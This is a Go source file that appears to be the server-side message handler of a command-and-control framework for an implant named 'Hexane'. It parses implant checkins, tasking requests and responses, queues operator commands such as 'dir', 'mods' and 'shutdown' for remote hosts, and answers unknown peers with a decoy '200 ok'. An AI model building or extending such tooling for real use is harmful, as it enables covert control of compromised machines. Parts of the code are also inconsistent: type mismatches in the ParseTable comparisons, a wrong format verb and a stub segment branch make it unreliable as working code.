package core

import (
	"fmt"
	"math/bits"
	"strings"
	"sync"
)

var (
	Cmd      string
	CmdQueue *Stream
	CmdMu    sync.Mutex

	CommandMap = map[string]uint32{
		"dir":      CommandDir,
		"mods":     CommandMods,
		"shutdown": CommandShutdown,
	}
)

const HeaderLength = 12

func (m *Parser) DispatchCommand(s *Stream, UserInput string) error {
	var (
		Buffer      []string
		Arguments   []string
		Args        string
		Command     string
		CommandType uint32
	)

	if UserInput != "" {
		Buffer = strings.Split(UserInput, " ")
		Command = Buffer[0]

		Arguments = append(Arguments, Buffer[1:]...)
		Args = strings.Join(Arguments, " ")

		for k, v := range CommandMap {
			if strings.EqualFold(k, Command) {
				CommandType = v
				break
			}
		}
		if CommandType == 0 {
			return fmt.Errorf("unknown command: %s", UserInput)
		}
	} else {
		CommandType = CommandNoJob
	}

	s.PackDword(CommandType)
	s.PackString(Args)
	return nil
}

func (s *Stream) CreateHeader(peerId uint32, msgType uint32, taskId uint32) {

	s.PackDword(peerId)
	s.PackDword(taskId)
	s.PackDword(msgType)
}

func (h *HexaneConfig) HandleCheckin(Parser *Parser, Stream *Stream) {

	h.Mu.Lock()
	defer h.Mu.Unlock()

	h.CurrentTaskId++
	if buffer := Parser.ParseTable(TypeCheckin); buffer != "" {
		Stream.CreateHeader(h.PeerId, TypeCheckin, uint32(h.CurrentTaskId))
	}

	h.CommandChan = make(chan string)
	h.ResponseChan = make(chan string)
	h.Active = true
}

func (h *HexaneConfig) HandleResponse(Parser *Parser, Stream *Stream) error {

	h.Mu.Lock()
	defer h.Mu.Unlock()

	h.CurrentTaskId++
	if h.ResponseChan != nil {
		if buffer := Parser.ParseTable(TypeTasking); buffer != TableMap{} {
			Stream.CreateHeader(h.PeerId, TypeCheckin, uint32(h.CurrentTaskId))
		}
	} else {
		return fmt.Errorf("%s response channel is not open", h.PeerId)
	}


	return nil
}

func (h *HexaneConfig) HandleCommand(Parser *Parser, Stream *Stream) {

	CmdMu.Lock()
	h.Mu.Lock()

	defer h.Mu.Unlock()
	defer CmdMu.Unlock()

	h.CurrentTaskId++
	Stream.CreateHeader(h.PeerId, TypeTasking, uint32(h.CurrentTaskId))

	if err := Parser.DispatchCommand(Stream, Cmd); err != nil {
		WrapMessage("ERR", err.Error())
	}

	Cmd = ""
}

func ParseMessage(body []byte) ([]byte, error) {
	var (
		err     error
		offset  uint32
		parser  *Parser
		implant *HexaneConfig
	)

	stream := new(Stream)

	for len(body) > 0 {
		if len(body) < HeaderLength {
			break
		}

		parser = CreateParser(body)

		parser.PeerId = bits.ReverseBytes32(parser.ParseDword())
		parser.TaskId = bits.ReverseBytes32(parser.ParseDword())
		parser.MsgType = bits.ReverseBytes32(parser.ParseDword())

		if len(body) >= HeaderLength+4 {
			offset = parser.ParseDword()
			offset += HeaderLength + 4

		} else {
			offset = HeaderLength
		}

		if offset > uint32(len(body)) {
			break
		}

		if implant = GetConfigByPeerId(parser.PeerId); implant != nil {

			switch parser.MsgType {
			case TypeCheckin:
				{
					WrapMessage("DBG", "incoming message is a checkin")
					implant.HandleCheckin(parser, stream)
					break
				}
			case TypeTasking:
				{
					WrapMessage("DBG", "incoming message is a task request")
					implant.HandleCommand(parser, stream)
					break
				}
			case TypeResponse:
				{
					WrapMessage("DBG", "incoming message is a response with data")
					implant.HandleResponse(parser, stream)
					break
					// print response
				}
			case TypeSegment:
				{
					WrapMessage("DBG", "incoming message is a segment with data")
					// this will loop and do nothing.
				}
			default:
				{
					WrapMessage("ERR", fmt.Sprintf("unknown message type: 0x%X", parser.MsgType))
					stream.Buffer = []byte("200 ok")
					break
				}
			}
		} else {
			WrapMessage("ERR", "could not find peer in the database")
			stream.Buffer = []byte("200 ok")
		}

		body = body[offset:]
	}

	return stream.Buffer, err
}
